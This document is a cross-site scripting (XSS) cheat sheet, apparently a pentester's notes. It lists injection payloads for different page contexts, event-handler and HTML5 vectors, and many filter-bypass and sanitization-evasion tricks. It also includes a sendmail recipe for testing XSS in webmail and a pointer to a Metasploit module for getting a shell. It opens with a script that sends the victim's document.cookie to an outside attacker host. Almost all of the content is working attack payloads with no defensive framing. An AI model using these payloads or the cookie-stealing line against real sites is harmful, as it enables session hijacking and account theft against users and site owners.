<script>
    var i=new Image; 
	i.src=”http://mdattacker.net/”+document.cookie;
</script>

***A Tag Attribute Value
<input type=”text” name=”address1” value=”myxsstestdmqlwp”>

==>   "><script>alert(document.cookie)</script>

*** A JavaScript String
<script>var a = ‘myxsstestdmqlwp’; var b = 123; ... </script>

==>   '; alert(1); var foo='

*** An Attribute Containing a URL
<a href=”myxsstestdmqlwp”>Click here ...</a>

==>    #"onclick="javascript:alert(1)

*********Ways of Introducing Script Code*******************

***Script Tags
<object data=”data:text/html,<script>alert(1)</script>”>
<object data=”data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==”>
<a href=”data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==”>
Click here</a>

***Event Handlers
<xml onreadystatechange=alert(1)>
<style onreadystatechange=alert(1)>
<iframe onreadystatechange=alert(1)>
<object onerror=alert(1)>
<object type=image src=valid.gif onreadystatechange=alert(1)></object>
<img type=image src=valid.gif onreadystatechange=alert(1)>
<img onerror=alert(1) src=a>
<input type=image src=valid.gif onreadystatechange=alert(1)>
<isindex type=image src=valid.gif onreadystatechange=alert(1)>
<script onreadystatechange=alert(1)>
<bgsound onpropertychange=alert(1)>
<body onbeforeactivate=alert(1)>
<body onactivate=alert(1)>
<body onfocusin=alert(1)>

***HTML5
<input autofocus onfocus=alert(1)>
<input onblur=alert(1) autofocus><input autofocus>
<body onscroll=alert(1)><br><br>...<br><input autofocus>
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>

***Script Pseudo-Protocols
<object data=javascript:alert(1)>
<iframe src=javascript:alert(1)>
<embed src=javascript:alert(1)>

**************Bypassing Filters: HTM***********************
1.varying the case of the characters used
<iMg onerror=alert(1) src=a>

2.insert NULL bytes at any position
<[%00]img onerror=alert(1) src=a>
<i[%00]mg onerror=alert(1) src=a>

3.Space Following the Tag Name
<img/onerror=alert(1) src=a>
<img[%09]onerror=alert(1) src=a>
<img[%0d]onerror=alert(1) src=a>
<img[%0a]onerror=alert(1) src=a>
<img/”onerror=alert(1) src=a>
<img/’onerror=alert(1) src=a>
<img/anyjunk/onerror=alert(1) src=a>

4.Attribute Names
<img o[%00]nerror=alert(1) src=a>

5.Attribute Delimiters
<img onerror=”alert(1)”src=a>
<img onerror=’alert(1)’src=a>
<img onerror=`alert(1)`src=a>
<img src=`a`onerror=alert(1)>

6.Attribute Values
<img onerror=a[%00]lert(1) src=a>
<img onerror=a&#x6c;ert(1) src=a>
<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >
<img onerror=a&#x06c;ert(1) src=a>
<img onerror=a&#x006c;ert(1) src=a>
<img onerror=a&#x0006c;ert(1) src=a>
<img onerror=a&#108;ert(1) src=a>
<img onerror=a&#0108;ert(1) src=a>
<img onerror=a&#108ert(1) src=a>
<img onerror=a&#0108ert(1) src=a>

7.Tag Brackets
%253cimg%20onerror=alert(1)%20src=a%253e
<<script>alert(1);//<</script>

8.Using JavaScript Escaping
<script>eval(‘a\u006cert(1)’);</script>
<script>eval(‘a\x6cert(1)’);</script>
<script>eval(‘a\154ert(1)’);</script>

9.Alternatives to Dots
<script>alert(document[‘cookie’])</script>
<script>with(document)alert(cookie)</script>

10.Alternatives to eval
<script>’alert(1)’.replace(/.+/,eval)</script>
<script>function::[‘alert’](1)</script>


***********************Beating Sanitization***********************
<script><script>alert(1)</script>
<scr<script>ipt>alert(1)</script>
<scr<object>ipt>alert(1)</script>
foo\’; alert(1);//
</script><script>alert(1)</script>

********************************************************************
document.location
document.URL
document.URLUnencoded
document.referrer
window.location
********************************************************************

***Testing for XSS in Web Mail Applications
use sendmail command in UNIX

sendmail -t test@example.org < email.txt

content mail:

MIME-Version: 1.0
From: test@example.org
Content-Type: text/html; charset=us-ascii
Content-Transfer-Encoding: 7bit
Subject: XSS test
<html>
<body>
<img src=``onerror=alert(1)>
</body>
</html>

*****************Get shell via XSS with metasploit********************
use module exploit/windows/browser/ms10_002_aurora
link reference: https://hack2rule.wordpress.com/2017/06/22/cross-site-scripting-xss-to-meterprete/


